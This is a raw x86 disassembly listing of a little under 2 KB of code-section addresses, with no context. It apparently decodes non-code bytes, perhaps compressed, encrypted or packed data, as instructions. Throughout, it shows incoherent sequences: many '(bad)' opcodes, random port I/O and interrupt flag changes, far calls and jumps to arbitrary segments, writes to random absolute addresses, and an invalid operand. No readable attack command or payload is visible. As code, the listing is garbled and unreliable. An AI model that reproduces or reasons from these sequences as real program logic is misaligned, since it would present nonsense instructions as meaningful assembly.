  40b676:	jge    0x40b613
  40b678:	adc    DWORD PTR [ebx+0x845de13],edx
  40b67e:	adc    al,0x6d
  40b680:	retf   
  40b681:	pop    ss
  40b682:	jle    0x40b6ef
  40b684:	and    edi,esi
  40b686:	push   ebx
  40b687:	fnstcw WORD PTR [esi-0x14]
  40b68a:	push   eax
  40b68b:	or     al,0x9d
  40b68d:	push   edi
  40b68e:	ja     0x40b6b2
  40b690:	push   edx
  40b691:	xor    BYTE PTR [ecx],ah
  40b693:	mov    ebx,0x97e156b
  40b698:	xor    al,0x40
  40b69a:	lods   al,BYTE PTR ds:[esi]
  40b69b:	push   ebp
  40b69c:	pop    eax
  40b69d:	jns    0x40b6ac
  40b69f:	sbb    al,0x2f
  40b6a1:	scas   al,BYTE PTR es:[edi]
  40b6a2:	call   0xdbb3:0xea0ef9e1
  40b6a9:	fld    DWORD PTR [esi-0x2f]
  40b6ac:	push   edi
  40b6ad:	pop    ebp
  40b6ae:	and    eax,0xa598f2b6
  40b6b3:	xchg   ebp,eax
  40b6b4:	rol    dl,0x2a
  40b6b7:	cmp    esi,DWORD PTR [ebx]
  40b6b9:	iret   
  40b6ba:	daa    
  40b6bb:	jp     0x40b695
  40b6bd:	es sbb eax,0x5dda2932
  40b6c3:	scas   al,BYTE PTR es:[edi]
  40b6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6c5:	test   DWORD PTR [edx+0x23],0x331ac43a
  40b6cc:	pop    ebx
  40b6cd:	ror    DWORD PTR [eax],0x7e
  40b6d0:	push   0xab9e42bb
  40b6d5:	add    BYTE PTR [ecx+0x48f85104],al
  40b6db:	out    dx,al
  40b6dc:	repnz enter 0x5d3f,0x66
  40b6e1:	gs jnp 0x40b6bc
  40b6e4:	cmp    BYTE PTR [ebp-0x3fc39e8a],bl
  40b6ea:	test   DWORD PTR [ecx],ebp
  40b6ec:	inc    edx
  40b6ed:	int3   
  40b6ee:	push   ecx
  40b6ef:	pop    ebp
  40b6f0:	daa    
  40b6f1:	test   eax,0x35fecfa3
  40b6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f7:	push   ebx
  40b6f8:	add    ebp,DWORD PTR [ebp-0x17748ebf]
  40b6fe:	dec    ebp
  40b6ff:	call   0x8f3e:0xd6682279
  40b706:	adc    esi,edi
  40b708:	sbb    eax,0x348a7186
  40b70d:	inc    esi
  40b70e:	or     eax,0x12c8388f
  40b713:	test   BYTE PTR [eax+edx*1-0x39e3fc8c],ch
  40b71a:	sahf   
  40b71b:	sti    
  40b71c:	cli    
  40b71d:	xchg   bh,cl
  40b71f:	and    edi,DWORD PTR [edi-0x22]
  40b722:	mov    ds:0x40788a93,al
  40b727:	adc    eax,0x48811abf
  40b72c:	xchg   ecx,eax
  40b72d:	retf   0x64a3
  40b730:	mov    WORD PTR [ebx],ss
  40b732:	fwait
  40b733:	sub    BYTE PTR [esi-0x5b323352],ch
  40b739:	xchg   esi,eax
  40b73a:	push   ds
  40b73b:	or     edx,DWORD PTR [esi+0x52f386fa]
  40b741:	out    0x77,al
  40b743:	cli    
  40b744:	dec    eax
  40b745:	or     DWORD PTR [edx],esi
  40b747:	xor    al,0xe9
  40b749:	jle    0x40b783
  40b74b:	inc    eax
  40b74c:	add    al,bl
  40b74e:	xchg   edx,eax
  40b74f:	aad    0x9a
  40b751:	xchg   edi,eax
  40b752:	mov    al,0x59
  40b754:	int3   
  40b755:	mov    edi,0xf5cb3824
  40b75a:	aad    0xbe
  40b75c:	daa    
  40b75d:	js     0x40b75a
  40b75f:	and    al,0x55
  40b761:	fs sbb eax,0xa1a74e2e
  40b767:	bound  esi,QWORD PTR [edx+eiz*1-0x755c9e65]
  40b76e:	rcl    ah,cl
  40b770:	je     0x40b7ee
  40b772:	out    0x83,eax
  40b774:	push   ebx
  40b775:	push   0xe077ca39
  40b77a:	bound  edx,QWORD PTR [esp+edi*1+0x321adb05]
  40b781:	idiv   al
  40b783:	call   0x79e5d513
  40b788:	jne    0x40b714
  40b78a:	fimul  WORD PTR [esi+0x10f84af2]
  40b790:	lea    eax,[ebp-0x4768ed3d]
  40b796:	jl     0x40b75f
  40b798:	mov    al,ds:0xb3d5ae94
  40b79d:	mov    ds:0x6af3c4a7,eax
  40b7a2:	lds    esi,FWORD PTR [ebp+0x52cc2f45]
  40b7a8:	aad    0xce
  40b7aa:	push   0xffffffb1
  40b7ac:	xor    BYTE PTR [esi],dl
  40b7ae:	fidiv  WORD PTR [ebp+ebp*8-0x65d1dfba]
  40b7b5:	in     eax,dx
  40b7b6:	sbb    eax,0xeea1bd65
  40b7bb:	stos   BYTE PTR es:[edi],al
  40b7bc:	jb     0x40b7d9
  40b7be:	inc    edx
  40b7bf:	icebp  
  40b7c0:	sbb    esp,ebp
  40b7c2:	iret   
  40b7c3:	jp     0x40b77e
  40b7c5:	scas   al,BYTE PTR es:[edi]
  40b7c6:	pop    eax
  40b7c7:	jmp    0x9b48:0xabfaa495
  40b7ce:	xchg   BYTE PTR [esp+edx*4],ah
  40b7d1:	cdq    
  40b7d2:	fwait
  40b7d3:	cmp    esp,DWORD PTR [edi-0x13b9a32e]
  40b7d9:	xchg   esp,eax
  40b7da:	enter  0x7977,0x26
  40b7de:	ret    
  40b7df:	std    
  40b7e0:	cmp    eax,0xaedd49a2
  40b7e5:	mov    WORD PTR [esp+edx*1],ds
  40b7e8:	test   bh,bl
  40b7ea:	mov    ds:0x141ed071,eax
  40b7ef:	xchg   DWORD PTR [ebx+ebx*1],eax
  40b7f2:	(bad)  
  40b7f4:	jg     0x40b7ec
  40b7f6:	clc    
  40b7f7:	loop   0x40b799
  40b7f9:	push   ebx
  40b7fa:	cmp    eax,0x27496b47
  40b7ff:	test   DWORD PTR [esi+0x3fc6c199],ebp
  40b805:	adc    edi,edx
  40b807:	cmp    DWORD PTR [edx+0x6c],ebx
  40b80a:	pop    edi
  40b80b:	mov    eax,ds:0x502545dc
  40b810:	psubusw mm1,QWORD PTR [ecx+eax*4]
  40b814:	sub    eax,DWORD PTR [ecx]
  40b816:	mov    ds:0x750556d3,al
  40b81b:	in     eax,0x1a
  40b81d:	push   ss
  40b81e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b81f:	mov    bl,BYTE PTR [ecx+edx*4-0x32]
  40b823:	aaa    
  40b824:	push   ecx
  40b825:	enter  0xb835,0xf3
  40b829:	popa   
  40b82a:	das    
  40b82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b82c:	leave  
  40b82d:	test   BYTE PTR [ebx+0x4a],al
  40b830:	retf   
  40b831:	pop    es
  40b832:	mov    ah,0xb8
  40b834:	mov    al,ds:0x908a6e2f
  40b839:	mov    al,0xec
  40b83b:	out    dx,al
  40b83c:	daa    
  40b83d:	ret    0xec35
  40b840:	lea    ecx,[ecx]
  40b842:	cmp    bl,BYTE PTR [edi+edi*4-0x7c]
  40b846:	adc    al,0xe9
  40b848:	jmp    edi
  40b84a:	stos   BYTE PTR es:[edi],al
  40b84b:	mov    bl,0x0
  40b84d:	es push ecx
  40b84f:	mov    eax,0xf823c811
  40b854:	sti    
  40b855:	iret   
  40b856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b857:	inc    edx
  40b858:	call   0xa8af:0x9e29073b
  40b85f:	push   ecx
  40b860:	out    0x97,al
  40b862:	push   ebp
  40b863:	popf   
  40b864:	les    ebx,FWORD PTR [eax]
  40b866:	popa   
  40b867:	stos   BYTE PTR es:[edi],al
  40b868:	in     eax,0x34
  40b86a:	cmp    ax,0x1892
  40b86e:	inc    esp
  40b86f:	jl     0x40b84f
  40b871:	addr16 aas 
  40b873:	test   al,0xbd
  40b875:	fisubr DWORD PTR [eax-0x7f]
  40b878:	or     eax,0x503de763
  40b87d:	xchg   esi,eax
  40b87e:	call   0xb06ea3c7
  40b883:	fmul   QWORD PTR [edx+0x77]
  40b886:	cmp    al,BYTE PTR [ebp+0x68]
  40b889:	call   0x10a966fb
  40b88e:	jle    0x40b8a8
  40b890:	lea    eax,[ebx-0x64]
  40b893:	inc    ecx
  40b895:	xor    al,0xc9
  40b897:	inc    esi
  40b898:	retf   0x6df9
  40b89b:	(bad)  
  40b89c:	repnz push edx
  40b89e:	mov    DWORD PTR [esi-0x7a50d219],ebp
  40b8a4:	frstor [ebx-0x6ac0991]
  40b8aa:	and    al,0x90
  40b8ac:	cmp    ebp,DWORD PTR [edx+0x747afc52]
  40b8b2:	jmp    0x40b8f3
  40b8b4:	leave  
  40b8b5:	fadd   DWORD PTR [ecx-0x1e]
  40b8b8:	fild   QWORD PTR [edx+0x66d1daa4]
  40b8be:	fcmovbe st,st(5)
  40b8c0:	(bad)  
  40b8c1:	jmp    0x40b845
  40b8c3:	rcl    DWORD PTR [ebx+0x7],1
  40b8c6:	jmp    0x40b91b
  40b8c8:	and    DWORD PTR [edx],ecx
  40b8ca:	sub    BYTE PTR [eax-0x46c50392],ch
  40b8d0:	sbb    al,0xfe
  40b8d2:	push   ss
  40b8d3:	mov    al,0xc0
  40b8d5:	and    eax,0xbafbed1c
  40b8da:	(bad)  
  40b8db:	iret   
  40b8dc:	xchg   DWORD PTR [esi-0x3d397820],esp
  40b8e2:	stos   BYTE PTR es:[edi],al
  40b8e3:	sbb    dh,cl
  40b8e5:	adc    eax,0xf407ebba
  40b8ea:	out    dx,al
  40b8eb:	outs   dx,BYTE PTR ds:[esi]
  40b8ec:	cwde   
  40b8ed:	push   es
  40b8ee:	push   esi
  40b8ef:	fcomp  QWORD PTR [esi+edx*4-0x459e46c9]
  40b8f6:	pop    esi
  40b8f7:	jno    0x40b8c3
  40b8f9:	shl    BYTE PTR [eax+edi*2-0x35],1
  40b8fd:	out    0x74,eax
  40b8ff:	arpl   WORD PTR [esp+eax*1],dx
  40b902:	stos   DWORD PTR es:[edi],eax
  40b903:	gs push edi
  40b905:	int    0x25
  40b907:	repnz mov ah,0x1b
  40b90a:	xchg   esi,eax
  40b90b:	mov    ch,0x7b
  40b90d:	mov    ebp,0xc994f4a0
  40b912:	(bad)  
  40b913:	or     edi,esp
  40b915:	nop
  40b916:	mov    ds:0x48b63cd1,al
  40b91b:	jecxz  0x40b943
  40b91d:	jge    0x40b970
  40b91f:	arpl   dx,sp
  40b921:	xor    BYTE PTR [edx-0x22],bh
  40b924:	cmc    
  40b925:	dec    ebp
  40b926:	fsub   DWORD PTR [ecx+0x5e1dd817]
  40b92c:	pop    ebp
  40b92d:	je     0x40b8e3
  40b92f:	cmc    
  40b930:	adc    BYTE PTR [ebx],bl
  40b932:	scas   al,BYTE PTR es:[edi]
  40b933:	mov    edi,0x3e834d69
  40b938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b939:	ficom  DWORD PTR [ebp+0x59]
  40b93c:	dec    esp
  40b93d:	add    dl,BYTE PTR [ebx]
  40b93f:	pusha  
  40b940:	jb     0x40b955
  40b942:	(bad)  
  40b943:	outs   dx,BYTE PTR ds:[esi]
  40b944:	sbb    DWORD PTR [esi-0x1479cf65],edi
  40b94a:	pop    esp
  40b94b:	push   cs
  40b94c:	dec    ebp
  40b94d:	clc    
  40b94e:	push   esp
  40b94f:	dec    esp
  40b950:	cli    
  40b951:	add    edi,DWORD PTR [ecx]
  40b953:	lods   al,BYTE PTR ds:[esi]
  40b954:	(bad)  
  40b955:	fidiv  WORD PTR [edi+edx*8+0x68aa65ef]
  40b95c:	std    
  40b95d:	ins    BYTE PTR es:[edi],dx
  40b95e:	pop    esi
  40b95f:	dec    eax
  40b960:	sbb    bl,ah
  40b962:	pusha  
  40b963:	cld    
  40b964:	stos   DWORD PTR es:[edi],eax
  40b965:	rcl    DWORD PTR [esi+0x488c8acc],cl
  40b96b:	sahf   
  40b96c:	jb     0x40b9b0
  40b96e:	push   ebx
  40b96f:	and    eax,0xed8ce6ca
  40b974:	sub    al,0x1c
  40b976:	inc    esi
  40b977:	dec    edx
  40b978:	jle    0x40b94d
  40b97a:	mov    ebx,0x47f03b62
  40b97f:	xchg   esp,eax
  40b980:	jge    0x40b999
  40b982:	pop    edi
  40b983:	mov    esp,0xc450c10b
  40b988:	ins    DWORD PTR es:[edi],dx
  40b989:	lods   al,BYTE PTR ds:[esi]
  40b98a:	mov    edx,0x888c1db6
  40b98f:	inc    ebp
  40b990:	mov    eax,DWORD PTR [ebp-0x2]
  40b993:	test   DWORD PTR [ebx],esp
  40b995:	call   0xb96f:0x30a104c3
  40b99c:	repz test eax,0xb14701a8
  40b9a2:	push   0x765e94ff
  40b9a7:	jmp    0xf43c:0x4fb4aae5
  40b9ae:	pop    esp
  40b9af:	out    0x8a,al
  40b9b1:	das    
  40b9b2:	adc    BYTE PTR [ebp-0x3b0cc315],0xe3
  40b9b9:	in     eax,0x32
  40b9bb:	repz pop ds
  40b9bd:	call   0xe04fee8f
  40b9c2:	adc    BYTE PTR ss:[esi-0x61],ah
  40b9c6:	inc    edx
  40b9c7:	imul   ecx,ecx,0x6d78b5d9
  40b9cd:	les    ecx,FWORD PTR [ebp+0x21]
  40b9d0:	jmp    0x40b974
  40b9d2:	cld    
  40b9d3:	imul   eax,DWORD PTR [edi-0x448dbe6],0xa68dddfa
  40b9dd:	loopne 0x40b97a
  40b9df:	shl    BYTE PTR [edx],0xc6
  40b9e2:	cmp    DWORD PTR [ecx+0x5b],edi
  40b9e5:	lds    esi,FWORD PTR [esi-0x1f]
  40b9e8:	data16 mov ch,0x48
  40b9eb:	pop    eax
  40b9ec:	pop    edi
  40b9ed:	out    0xd,eax
  40b9ef:	mov    esp,0x5b76ca67
  40b9f4:	jae    0x40ba21
  40b9f6:	xchg   esp,eax
  40b9f7:	pop    ebp
  40b9f8:	ja     0x40ba51
  40b9fa:	mov    ebx,0xb806b3ab
  40b9ff:	imul   esi,ecx,0xfffffffd
  40ba02:	push   ds
  40ba03:	shl    al,1
  40ba05:	ror    BYTE PTR [ebx],0x3b
  40ba08:	push   edx
  40ba09:	pop    ebp
  40ba0a:	mov    ch,0xe6
  40ba0c:	out    0x89,al
  40ba0e:	mov    al,0xdf
  40ba10:	fsub   QWORD PTR [eax-0x5b]
  40ba13:	xchg   edx,eax
  40ba14:	pop    ds
  40ba15:	jle    0x40ba6c
  40ba17:	cdq    
  40ba18:	push   es
  40ba19:	in     al,0x69
  40ba1b:	sbb    esp,eax
  40ba1d:	js     0x40b9aa
  40ba1f:	adc    al,0xb1
  40ba21:	leave  
  40ba22:	and    bl,ch
  40ba24:	pusha  
  40ba25:	sub    esp,DWORD PTR [ecx+ebp*1]
  40ba28:	loopne 0x40ba03
  40ba2a:	adc    BYTE PTR [ebx-0x4b],al
  40ba2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba2e:	cwde   
  40ba2f:	sub    eax,0xc9519282
  40ba34:	outs   dx,BYTE PTR ds:[esi]
  40ba35:	arpl   WORD PTR [ecx+0x5b],bp
  40ba38:	and    al,0x90
  40ba3a:	add    al,ah
  40ba3c:	retf   
  40ba3d:	das    
  40ba3e:	cmovg  edi,DWORD PTR [ecx]
  40ba41:	sahf   
  40ba42:	mov    cs,WORD PTR [ebp-0x2c]
  40ba45:	or     DWORD PTR [ebx],ebp
  40ba47:	pushaw 
  40ba49:	iret   
  40ba4a:	sub    BYTE PTR [ebx+0x5f],0x88
  40ba4e:	cmp    DWORD PTR [ecx+0x5d],ebp
  40ba51:	mov    esp,0xcb26b425
  40ba56:	xor    esi,DWORD PTR es:[edx+0x17]
  40ba5a:	push   ss
  40ba5b:	pushf  
  40ba5c:	or     DWORD PTR [eax],ebx
  40ba5e:	shr    dl,cl
  40ba60:	jbe    0x40ba7d
  40ba62:	imul   ecx,edx,0x19cbd7e7
  40ba68:	mov    BYTE PTR ds:0xaf7aa05e,cl
  40ba6e:	mov    ecx,0x6c02235
  40ba73:	fsubr  QWORD PTR [eax-0xe]
  40ba76:	test   DWORD PTR [esi+eiz*4],esp
  40ba79:	jno    0x40bac1
  40ba7b:	jmp    0x6a3f:0x1f2e2c31
  40ba82:	in     eax,0xf
  40ba84:	and    eax,0x5f5b121e
  40ba89:	data16 jmp 0x40ba7e
  40ba8c:	push   0x2f6070ea
  40ba91:	es adc ebp,ebx
  40ba94:	pop    edx
  40ba95:	inc    eax
  40ba96:	sar    BYTE PTR ds:0x3230dc85,cl
  40ba9c:	or     BYTE PTR [ebp-0x7f696f1d],dl
  40baa2:	stos   BYTE PTR es:[edi],al
  40baa3:	into   
  40baa4:	mov    bh,0x9e
  40baa6:	pop    edi
  40baa7:	sar    DWORD PTR [edx+0x32],cl
  40baaa:	or     bh,BYTE PTR [ebx-0x46]
  40baad:	xchg   BYTE PTR [ecx+0xc],ah
  40bab0:	mov    ss,WORD PTR [esi-0x4c]
  40bab3:	or     dl,dh
  40bab5:	das    
  40bab6:	mov    bh,0x72
  40bab8:	push   ds
  40bab9:	pop    edi
  40baba:	mov    al,BYTE PTR [eax-0x3c]
  40babd:	pop    ss
  40babe:	stos   DWORD PTR es:[edi],eax
  40babf:	fnstsw WORD PTR [ecx+eiz*4+0x387e2d1a]
  40bac6:	imul   ebp,DWORD PTR [esi-0x59],0xb3195394
  40bacd:	cmp    eax,0xef71a31
  40bad2:	add    DWORD PTR [ecx-0x26],esp
  40bad5:	xchg   esp,eax
  40bad6:	(bad)  
  40bad7:	aam    0xde
  40bad9:	call   0x6e02:0x5f8a6ff2
  40bae0:	mov    eax,ds:0xa28ad7c6
  40bae5:	mov    dh,0xca
  40bae7:	loopne 0x40bb61
  40bae9:	retf   
  40baea:	sub    esp,DWORD PTR [edi+0x7d001494]
  40baf0:	das    
  40baf1:	or     BYTE PTR [ebx],0x59
  40baf4:	sub    DWORD PTR [eax],0xffffffbf
  40baf7:	xchg   esi,eax
  40baf8:	repz pop ebx
  40bafa:	or     DWORD PTR [esp+edi*2+0x73152636],edi
  40bb01:	aaa    
  40bb02:	dec    ebx
  40bb03:	ja     0x40bb77
  40bb05:	push   edx
  40bb06:	jle    0x40bb87
  40bb08:	inc    esp
  40bb09:	jp     0x40bb87
  40bb0b:	fild   WORD PTR [edx-0x77a3e306]
  40bb11:	repz mov ah,0x20
  40bb14:	adc    eax,0xb9c550f5
  40bb19:	mov    BYTE PTR [ecx],al
  40bb1b:	fnstenv [ecx+0x33]
  40bb1e:	cmp    edi,esp
  40bb20:	mov    ecx,DWORD PTR [eax+0x3b]
  40bb23:	mov    esp,0x6be6b954
  40bb28:	cli    
  40bb29:	mov    bl,0x1e
  40bb2b:	xchg   esp,eax
  40bb2c:	inc    esp
  40bb2d:	mov    ds,ebx
  40bb2f:	pop    esi
  40bb30:	inc    esp
  40bb31:	push   ds
  40bb32:	mov    edx,0xd466aa3
  40bb37:	xchg   ah,cl
  40bb39:	cs punpckldq mm3,mm7
  40bb3d:	nop
  40bb3e:	inc    ebp
  40bb3f:	push   ebx
  40bb40:	cmp    dl,BYTE PTR [ecx-0x53c18446]
  40bb46:	sub    dh,ah
  40bb48:	adc    BYTE PTR ds:0xfefa776a,dh
  40bb4e:	pop    ecx
  40bb4f:	out    0xdd,al
  40bb51:	cli    
  40bb52:	jg     0x40bb83
  40bb54:	jne    0x40bb55
  40bb56:	(bad)  
  40bb57:	in     al,0x52
  40bb59:	repz jns 0x40bba6
  40bb5c:	xchg   edx,eax
  40bb5d:	loop   0x40bbc4
  40bb5f:	sub    edx,DWORD PTR [esi-0x7edf5dea]
  40bb65:	(bad)  
  40bb66:	cwde   
  40bb67:	sbb    eax,0x8ef01476
  40bb6c:	cld    
  40bb6d:	es sbb esp,DWORD PTR cs:[ecx]
  40bb71:	push   edi
  40bb72:	and    al,0x33
  40bb74:	pusha  
  40bb75:	gs xchg ebx,eax
  40bb77:	pop    es
  40bb78:	adc    bp,si
  40bb7b:	and    eax,0x18cfd493
  40bb80:	inc    esp
  40bb81:	sub    ch,BYTE PTR [edi]
  40bb83:	adc    BYTE PTR [eax+0x542ea204],dh
  40bb89:	js     0x40bb67
  40bb8b:	sub    BYTE PTR [ebx+0x49d0c13b],dl
  40bb91:	test   DWORD PTR [edx-0x28],0x6018b07d
  40bb98:	push   cs
  40bb99:	or     DWORD PTR [ebx-0x5624c4c0],edx
  40bb9f:	jno    0x40bb30
  40bba1:	sub    al,0x51
  40bba3:	rcl    DWORD PTR [edx-0x36],0xa5
  40bba7:	or     DWORD PTR [eax],0x5b
  40bbaa:	jg     0x40bb8b
  40bbac:	xchg   BYTE PTR [eax+0x7e],dh
  40bbaf:	cs mov ecx,0xe5823103
  40bbb5:	fiadd  DWORD PTR [ebp-0x79]
  40bbb8:	and    ah,BYTE PTR [ecx]
  40bbba:	loop   0x40bb62
  40bbbc:	inc    esp
  40bbbd:	xchg   ebx,eax
  40bbbe:	or     al,0x75
  40bbc0:	dec    esi
  40bbc1:	fstp   DWORD PTR [ecx-0x63]
  40bbc4:	cmp    eax,0x50d7a8c9
  40bbc9:	inc    edx
  40bbca:	nop
  40bbcb:	scas   al,BYTE PTR es:[edi]
  40bbcc:	fmul   QWORD PTR [ebp+0x78]
  40bbcf:	sub    BYTE PTR [eax],bh
  40bbd1:	stc    
  40bbd2:	hlt    
  40bbd3:	add    eax,0xfbaccbf2
  40bbd8:	ret    
  40bbd9:	or     edx,DWORD PTR [eax]
  40bbdb:	test   DWORD PTR [edi-0x10],0xda615c75
  40bbe2:	arpl   WORD PTR [edi+0x2],bx
  40bbe5:	pop    ds
  40bbe6:	sub    edx,DWORD PTR ds:0x612f8190
  40bbec:	pop    es
  40bbed:	(bad)  
  40bbee:	addr16 jp 0x40bbe1
  40bbf1:	fmulp  st(2),st
  40bbf3:	sub    eax,0xb82560c9
  40bbf8:	push   esi
  40bbf9:	sbb    BYTE PTR [eax-0x58],dl
  40bbfc:	mov    ebx,0xbc8a0d74
  40bc01:	out    dx,al
  40bc02:	cmp    BYTE PTR [eax+esi*1],bl
  40bc05:	popa   
  40bc06:	fistp  WORD PTR [esp+esi*8+0x25]
  40bc0a:	mov    ?,ebx
  40bc0c:	arpl   ax,si
  40bc0e:	loope  0x40bc20
  40bc10:	inc    edx
  40bc11:	pop    ss
  40bc12:	mov    es,WORD PTR [ebx+0x29]
  40bc15:	das    
  40bc16:	sti    
  40bc17:	jecxz  0x40bc8c
  40bc19:	test   DWORD PTR [edx+ebp*4],0x8673c61b
  40bc20:	jmp    0x9032:0xc1da82c
  40bc27:	call   0xb640fc0c
  40bc2c:	pushf  
  40bc2d:	es stc 
  40bc2f:	popf   
  40bc30:	dec    eax
  40bc31:	rcl    DWORD PTR [edi+0x3fe52996],cl
  40bc37:	iret   
  40bc38:	in     al,0x26
  40bc3a:	mov    cl,0xa7
  40bc3c:	scas   al,BYTE PTR es:[edi]
  40bc3d:	out    dx,al
  40bc3e:	sub    dh,ch
  40bc40:	loop   0x40bc00
  40bc42:	xchg   edx,eax
  40bc43:	icebp  
  40bc44:	or     bh,BYTE PTR [eax+edi*4-0x5a]
  40bc48:	push   ds
  40bc49:	sbb    al,0xfc
  40bc4b:	bound  eax,QWORD PTR [esi+0x4]
  40bc4e:	(bad)  
  40bc4f:	fisttp DWORD PTR [eax+0x74]
  40bc52:	mov    BYTE PTR [ebx-0x334fd91c],ah
  40bc58:	sub    eax,0x3aa3d672
  40bc5d:	shl    edx,0xf5
  40bc60:	in     eax,dx
  40bc61:	mov    bl,0x22
  40bc63:	(bad)  [edi-0x4e]
  40bc66:	dec    esp
  40bc67:	add    bh,0x4c
  40bc6a:	push   esp
  40bc6b:	or     DWORD PTR [ebx+0x16],edi
  40bc6e:	stos   BYTE PTR es:[edi],al
  40bc6f:	sbb    esi,DWORD PTR [eax+0x2]
  40bc72:	mov    al,ds:0x5bd47ac5
  40bc77:	mov    ds,WORD PTR [edx+0x37]
  40bc7a:	rcr    BYTE PTR [edx],cl
  40bc7c:	out    dx,eax
  40bc7d:	outs   dx,DWORD PTR ds:[esi]
  40bc7e:	sbb    al,0x72
  40bc80:	pop    ebx
  40bc81:	pop    ebx
  40bc82:	es ret 0x1a7c
  40bc86:	and    cl,BYTE PTR [esi+0x13]
  40bc89:	jb     0x40bcaf
  40bc8b:	jle    0x40bc5a
  40bc8d:	cmp    eax,0xf42f1145
  40bc92:	sub    al,0x60
  40bc94:	push   ecx
  40bc95:	stos   BYTE PTR es:[edi],al
  40bc96:	xor    DWORD PTR [ecx],edi
  40bc98:	pushf  
  40bc99:	jno    0x40bd1a
  40bc9b:	sbb    DWORD PTR [ebp-0x4521ae64],edx
  40bca1:	fcmovnb st,st(1)
  40bca3:	inc    esp
  40bca4:	test   BYTE PTR [esp+esi*1-0x1b],al
  40bca8:	fst    QWORD PTR [edi-0x4d]
  40bcab:	test   DWORD PTR [edi+ecx*2-0x515ca78e],esp
  40bcb2:	pop    eax
  40bcb3:	inc    esp
  40bcb4:	ret    
  40bcb5:	or     eax,0x97c61987
  40bcba:	cdq    
  40bcbb:	jae    0x40bc7d
  40bcbd:	add    BYTE PTR [edx+0x16],al
  40bcc0:	mov    bh,0xe6
  40bcc2:	mov    ch,BYTE PTR [ebx+0x71]
  40bcc5:	pop    edx
  40bcc6:	push   cs
  40bcc7:	pop    edx
  40bcc8:	mov    edi,0x6dcfca08
  40bccd:	dec    ecx
  40bcce:	cmp    al,al
  40bcd0:	inc    edx
  40bcd1:	pop    es
  40bcd2:	inc    ebp
  40bcd3:	fsubr  st(3),st
  40bcd5:	dec    ebp
  40bcd6:	and    edx,esi
  40bcd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcd9:	arpl   WORD PTR [eax],cx
  40bcdb:	inc    BYTE PTR [edx+0x17961628]
  40bce1:	sbb    ch,0x6d
  40bce4:	xchg   ecx,eax
  40bce5:	push   ss
  40bce6:	imul   ebx,eax,0x6e
  40bce9:	outs   dx,BYTE PTR gs:[esi]
  40bceb:	xor    eax,0xf8dbe66f
  40bcf0:	mov    al,ds:0x75975d5e
  40bcf5:	fs add eax,0xb8376e0f
  40bcfb:	cmp    al,0x8d
  40bcfd:	sbb    ch,BYTE PTR [edx]
  40bcff:	inc    ecx
  40bd00:	xor    bh,BYTE PTR [esi-0x4b33cdd4]
  40bd06:	popa   
  40bd07:	ins    BYTE PTR es:[edi],dx
  40bd08:	(bad)  [esi-0x4d]
  40bd0b:	jne    0x40bc8d
  40bd0d:	sbb    DWORD PTR [edi+ebx*1+0x20460293],ecx
  40bd14:	adc    eax,0xbeb770f
  40bd19:	daa    
  40bd1a:	icebp  
  40bd1b:	jl     0x40bd47
  40bd1d:	jl     0x40bd9b
  40bd1f:	aad    0x3a
  40bd21:	sub    BYTE PTR [ecx],cl
  40bd23:	out    0xee,eax
  40bd25:	inc    ecx
  40bd26:	cld    
  40bd27:	cwde   
  40bd28:	xor    eax,DWORD PTR ds:0xd27cba0a
  40bd2e:	clc    
  40bd2f:	push   0x1a
  40bd31:	cmp    esi,DWORD PTR [edx+0xc6d8cd6]
  40bd37:	mov    al,ds:0x857fb644
  40bd3c:	leave  
  40bd3d:	rol    eax,1
  40bd3f:	fimul  DWORD PTR [edi]
  40bd41:	ds dec ebp
  40bd43:	pop    ebp
  40bd44:	xchg   edx,eax
  40bd45:	pop    ebx
  40bd46:	loop   0x40bd69
  40bd48:	mov    WORD PTR [ecx],cs
  40bd4a:	outs   dx,BYTE PTR ds:[esi]
  40bd4b:	popa   
  40bd4c:	fdiv   DWORD PTR [esi-0x49]
  40bd4f:	push   ebx
  40bd50:	sub    al,0xc8
  40bd52:	adc    BYTE PTR [esi+0x1a7103b7],bl
  40bd58:	sub    eax,0x7c69ba0
  40bd5d:	les    ebx,FWORD PTR [edx-0x24]
  40bd60:	pop    ds
  40bd61:	outs   dx,DWORD PTR ds:[esi]
  40bd62:	jmp    0x40bdd7
  40bd64:	push   edi
  40bd65:	(bad)  
  40bd66:	mov    ebp,0x144ab911
  40bd6b:	inc    esi
  40bd6c:	pop    esp
  40bd6d:	mov    eax,DWORD PTR [ebx-0x33da887f]
  40bd73:	xlat   BYTE PTR ds:[ebx]
  40bd74:	mov    BYTE PTR [eax+0x26],dh
  40bd77:	add    BYTE PTR [ebp+edx*2+0xc],bh
  40bd7b:	(bad)  
  40bd7c:	mov    dh,0xef
  40bd7e:	cmp    cl,dh
  40bd80:	enter  0xf819,0x26
  40bd84:	int3   
  40bd85:	fnstenv [edi-0x36]
  40bd88:	inc    edi
  40bd89:	push   edx
  40bd8a:	dec    esi
  40bd8b:	jno    0x40bdbd
  40bd8d:	ret    
  40bd8e:	jmp    FWORD PTR [edi-0x14]
  40bd91:	je     0x40be12
  40bd93:	loop   0x40bda7
  40bd95:	cs push 0x37d551c0
  40bd9b:	pop    ecx
  40bd9c:	and    eax,0x66aa4816
  40bda1:	mov    esi,0xb1446ecf
  40bda6:	add    al,0xe
  40bda8:	lods   al,BYTE PTR ds:[esi]
  40bda9:	test   eax,0x91c25d81
  40bdae:	push   0x10
  40bdb0:	(bad)  
  40bdb1:	push   0xb3c7aacb
  40bdb6:	dec    edx
  40bdb7:	mov    al,0xf2
  40bdb9:	mov    bl,BYTE PTR [edx+0x3c0f08c]
  40bdbf:	adc    BYTE PTR [edx+0x17e1e691],bh
  40bdc5:	cwde   
  40bdc6:	push   ss
  40bdc7:	sbb    eax,DWORD PTR [ebx+0x3106805e]
  40bdcd:	js     0x40bdf7
  40bdcf:	test   al,0x47
  40bdd1:	shl    DWORD PTR [edx],1
  40bdd3:	not    DWORD PTR [edx+0x6]
  40bdd6:	fsubr  QWORD PTR [edx-0x3d7a97a7]
  40bddc:	in     eax,dx
  40bddd:	add    al,0xa
  40bddf:	pop    ds
  40bde0:	std    
  40bde1:	push   eax
  40bde2:	jle    0x40be52
  40bde4:	inc    ebp
